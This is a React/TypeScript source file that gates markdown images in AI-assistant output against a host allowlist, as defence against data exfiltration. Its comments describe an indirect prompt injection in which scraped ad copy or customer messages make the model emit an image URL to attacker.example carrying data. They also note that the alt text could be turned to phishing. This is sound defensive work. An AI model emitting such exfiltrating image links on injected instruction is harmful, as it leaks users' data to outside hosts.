"use client";

import { Image as ImageIcon } from "lucide-react";
import type { Components, UrlTransform } from "react-markdown";
import {
  CHAT_ASSISTANT_IMAGE_POLICY,
  createAssistantMarkdownUrlTransform,
  REPORT_ASSISTANT_IMAGE_POLICY,
  resolveAssistantImageSource,
  type AssistantImageBlockReason,
  type AssistantImageHostPolicy,
} from "./assistant-image-src";

/**
 * The two react-markdown props that stop an assistant-authored image URL from reaching the browser
 * (SEC-012 / ADM-10870, extended to every AI markdown surface by SEC-012b / ADM-10938).
 *
 * Every renderer that prints model output shares the same exposure: an indirect prompt injection in
 * the model's context — scraped ad copy, a Meta campaign name, a customer message — makes it emit
 * `![](https://attacker.example/p.png?d=<data>)`, and the browser fetches that the moment the
 * message paints. Bundling both gates behind one factory keeps a surface from being half-protected:
 * `urlTransform` alone leaves the renderer trusting whatever it is handed, and a gated renderer
 * alone leaves the raw URL in the props react-markdown builds.
 */
export interface AssistantMarkdownGate {
  readonly urlTransform: UrlTransform;
  readonly components: Components;
}

export interface AssistantMarkdownGateOptions {
  /** Hosts this surface may auto-fetch from. Defaults to AdManage media hosts only. */
  readonly policy?: AssistantImageHostPolicy;
  /** Classes for an allowed image. Defaults to the chat assistant's inline-media sizing. */
  readonly imageClassName?: string;
  /** `alt` used when the model supplied none. */
  readonly altFallback?: string;
  /** Hide the element if the allowed source 404s, instead of showing a broken-image icon. */
  readonly hideOnError?: boolean;
}

const BLOCKED_IMAGE_LABEL = "Image from an unrecognized source was blocked";

const DEFAULT_IMAGE_CLASS_NAME = "my-2 max-h-72 w-auto max-w-full rounded-lg";

const BLOCKED_IMAGE_CLASS_NAME =
  "my-1 inline-flex items-center gap-1.5 rounded-md border border-border bg-muted px-2 py-1 text-xs text-muted-foreground";

/**
 * Placeholder shown in place of a refused image.
 *
 * Deliberately renders a fixed label rather than the markdown `alt` text: the injected content
 * controls `alt` too, and echoing it turns a blocked exfiltration attempt into a phishing line
 * ("Session expired, re-enter your password at …") printed in the assistant's own voice.
 */
function BlockedAssistantImage({ reason }: { readonly reason: AssistantImageBlockReason }) {
  return (
    <span
      data-testid="assistant-blocked-image"
      // Fixed enum, never attacker data. Exposing it makes the first gate observable: when
      // `urlTransform` is wired up it has already stripped the attribute, so a refused source
      // arrives here as `missing` rather than `host-not-allowlisted`.
      data-block-reason={reason}
      title={BLOCKED_IMAGE_LABEL}
      className={BLOCKED_IMAGE_CLASS_NAME}
    >
      <ImageIcon className="h-3.5 w-3.5" aria-hidden="true" />
      {BLOCKED_IMAGE_LABEL}
    </span>
  );
}

/**
 * Builds both halves of the gate for one rendering surface.
 *
 * The returned `components.img` re-checks the source itself rather than trusting `urlTransform`,
 * so removing or misconfiguring one prop cannot silently reopen the channel. Call this once at
 * module scope: a fresh component identity on every render would remount every image.
 */
export function createAssistantMarkdownGate(options: AssistantMarkdownGateOptions = {}): AssistantMarkdownGate {
  const {
    policy = CHAT_ASSISTANT_IMAGE_POLICY,
    imageClassName = DEFAULT_IMAGE_CLASS_NAME,
    altFallback = "",
    hideOnError = false,
  } = options;

  // `src` arrives as react-markdown types it (`string | Blob | undefined`). A non-string can only
  // come from a rehype plugin, never from markdown — normalize it to `undefined` so it is refused
  // rather than stringified into an object URL.
  function AssistantMarkdownImage({ src, alt }: { readonly src?: string | Blob; readonly alt?: string }) {
    const source = resolveAssistantImageSource(typeof src === "string" ? src : undefined, policy);
    if (source.kind === "blocked") return <BlockedAssistantImage reason={source.reason} />;

    return (
      // eslint-disable-next-line @next/next/no-img-element
      <img
        src={source.src}
        alt={alt || altFallback}
        loading="lazy"
        className={imageClassName}
        onError={hideOnError ? (event) => (event.currentTarget.style.display = "none") : undefined}
      />
    );
  }

  return {
    urlTransform: createAssistantMarkdownUrlTransform(policy),
    components: { img: ({ src, alt }) => <AssistantMarkdownImage src={src} alt={alt} /> },
  };
}

/**
 * Shared gate for surfaces whose assistant only ever produces prose — automation, dashboard
 * commentary, spend analysis, the data/cost chats. None of their prompts mention images, so any
 * markdown image they emit came from their context rather than from us.
 */
export const ASSISTANT_PROSE_MARKDOWN_GATE: AssistantMarkdownGate = createAssistantMarkdownGate();

/**
 * Shared gate for the reports chat surface (`/reports`, driven by
 * `useReportChat` → `/api/reports-chat`). That route tells the model to render every row's
 * `thumbnail_url`, so images there are a feature rather than a red flag — but the URL still arrives
 * as model-authored text, so it goes through the same check against a wider host policy.
 *
 * `hideOnError` preserves the surface's existing behaviour for thumbnails that 404: an ad whose
 * creative has aged out of the CDN collapses instead of showing a broken-image icon.
 */
export const REPORT_THUMBNAIL_MARKDOWN_GATE: AssistantMarkdownGate = createAssistantMarkdownGate({
  policy: REPORT_ASSISTANT_IMAGE_POLICY,
  imageClassName: "rounded-lg max-w-[200px] h-auto my-2 border shadow-sm",
  altFallback: "Ad thumbnail",
  hideOnError: true,
});
